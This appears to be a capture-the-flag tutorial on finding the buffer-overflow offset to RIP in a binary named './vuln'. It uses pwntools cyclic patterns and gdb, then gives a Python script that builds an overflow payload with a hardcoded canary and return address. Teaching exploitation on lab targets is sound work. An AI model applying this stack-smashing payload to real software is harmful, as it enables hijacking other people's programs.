# The 10-second GDB Trick (Exact Offset Discovery)

The idea:

1. Send a **unique cyclic pattern**
2. Let the program crash
3. Read the overwritten value of **RIP**
4. Ask the pattern where that value came from

Then we know the exact offset.

---

# Step 1 - Generate cyclic pattern

On your machine run:

```bash
python3 - <<'EOF'
from pwn import *
print(cyclic(400).decode())
EOF
```

Copy the output.

---

# Step 2 - Run inside the challenge

```
./vuln
400
<paste cyclic string>
```

The program will crash.

---

# Step 3 - Inspect RIP

Inside gdb:

```
gdb ./vuln
run
```

Provide the same input again.

When it crashes run:

```
info registers
```

Look for:

```
RIP = 0x6161616b
```

(or similar).

---

# Step 4 - Ask pwntools where that came from

On your machine:

```
python3
```

Then:

```python
from pwn import *
cyclic_find(0x6161616b)
```

It will return something like:

```
152
```

That is the **exact offset to RIP**.

No guessing required.

---

# Step 5 - Build the final payload

Once the offset is known (example: 152):

```python
from pwn import *
import struct

offset = 152
canary = b"itsY"

payload  = b"A"*128
payload += canary
payload += b"B"*(offset - 128 - 4)
payload += struct.pack("<Q",0x4008fd)

print(len(payload))
sys.stdout.buffer.write(payload)
```

---

# Why this trick works

Because a cyclic pattern like:

```
aaaabaaacaaadaaa...
```

ensures **every 4-byte sequence is unique**.
So when RIP becomes `0x6161616b`, pwntools can map it back to the exact position.

---